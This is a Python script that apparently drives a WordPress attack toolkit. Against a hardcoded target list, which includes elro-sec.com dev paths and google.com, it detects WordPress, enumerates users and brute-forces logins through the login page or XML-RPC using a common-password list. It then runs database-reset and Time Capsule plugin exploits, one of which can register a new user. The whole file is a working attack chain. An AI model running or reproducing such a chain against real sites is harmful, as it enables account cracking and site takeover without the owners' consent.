from wordpress import WPLoginPageBruteforcer, WPXmlrpcBruteforcer, WPDetector, WPEnumerator, WPDatabaseResetExploiter, WPTimeCapsuleExploiter


passwords = ["123456", "Aa100100", "Admin123", "Aa123123", "admin", "administrator", "Admin1234"]
user_names = ["admin", "Administrator", "Royi"]


def main():
    global user_names
    webs = list()
    webs.append("https://elro-sec.com/dev1/")
    webs.append("https://elro-sec.com/dev2/")
    webs.append("https://elro-sec.com/dev3/")
    webs.append("https://www.google.com/")
    webs.append("tttteeeeeesssssssstttttt")
    webs.append("tttteeeeeessssssssttt.com")
    for url in webs:
        print("# Start execute for {}".format(url))
        # first checking if wp
        det = WPDetector(domain=url)
        is_wp = det.detect()
        if not is_wp:
            continue
        # This is a WordPress site, lets continue ...
        ver = det.get_version()
        print("\t# The version is: {}".format(ver))
        enumerator = WPEnumerator(domain=url)
        # then enumerating the users if possible
        is_enumeration_possible = enumerator.is_enumeration_possible()
        if is_enumeration_possible:
            enumerated_users_dict = enumerator.enumerate()
            if enumerated_users_dict is not None:
                print("\t# Users and passwords:")
                for id, user in enumerated_users_dict.items():
                    print("\t# ID: {} - Username: {}".format(id, user))
                if len(enumerated_users_dict) > 0:
                    user_names = enumerated_users_dict.values()
        cracked_users = dict()
        bruteforcer = WPLoginPageBruteforcer(domain=url)
        bruteforce_is_possible = bruteforcer.is_method_possible()
        if not bruteforce_is_possible:
            bruteforcer = WPXmlrpcBruteforcer(domain=url)
            bruteforce_is_possible = bruteforcer.is_method_possible()
            if not bruteforce_is_possible:
                print("# Brute force is not possible at all for {}".format(url))
        if bruteforce_is_possible:
            cracked_users = bruteforcer.bruteforce(usernames=user_names, passwords=passwords, threads=10)
            for user, password in cracked_users.items():
                print("\t# Username: {} - Password: {}".format(user, password))
        # Exploit:
        exploiter = WPDatabaseResetExploiter(domain=url)
        is_possible = exploiter.is_vulnerable()
        if is_possible:
            exploit_data = None
            if len(cracked_users) > 0:
                user = list(cracked_users.keys())[0]
                exploit_data = {
                    "username": user,
                    "password": cracked_users[user],
                    "action": "login"
                }
            # if exploit_data is None => the exploit will register new user.
            exploiter.exploit(data=exploit_data)
        else:
            print("# Exploit via WPDatabaseResetExploiter is not possible for this site.")
        exploiter = WPTimeCapsuleExploiter(domain=url)
        is_possible = exploiter.is_vulnerable()
        if is_possible:
            exploiter.exploit()
        else:
            print("# Exploit via WPTimeCapsuleExploiter is not possible for this site.")
        print("# Done!")


if __name__ == '__main__':
    main()
